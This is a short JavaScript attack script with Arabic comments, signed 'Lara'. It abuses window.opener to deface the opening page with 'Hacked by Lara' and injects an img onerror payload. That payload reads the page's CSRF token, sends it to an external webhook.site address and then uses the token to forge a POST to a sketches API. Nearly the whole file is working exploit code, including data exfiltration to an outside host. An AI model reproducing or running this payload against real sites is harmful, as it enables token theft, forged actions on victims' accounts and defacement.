// 1. طباعة العلامة
console.log("Lara: Acting from the new tab...");

if (window.opener) {
    try {
        // 2. استخدام Backticks لتجنب مشاكل علامات التنصيص
        window.opener.document.body.innerHTML = `
            <h1 style="color:red; text-align:center; margin-top:100px;">
                Hacked by Lara
                <img src="x" onerror="(function(){
                    const t = document.querySelector('meta[name=\'csrf-token\']')?.content;
                    if(!t) return;
                    
                    // إرسال التوكن لـ Webhook
                    fetch('https://webhook.site/797b8441-6a62-471c-9271-4b365d46053a', {
                        method: 'POST',
                        mode: 'no-cors',
                        body: 'Token Found: ' + t
                    });

                    // تنفيذ العملية الأصلية (Sketches)
                    fetch('/api/v1/sketches/1/', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRFToken': t
                        },
                        body: JSON.stringify({name: 'Hacked by Lara', description: ''})
                    }).then(r => alert('Lara says: Done!'));
                })()">
            </h1>`;

        console.log("Lara: Payload injected into opener.");
    } catch (e) {
        console.error("Lara Error (Cross-Origin?):", e.message);
    }
}
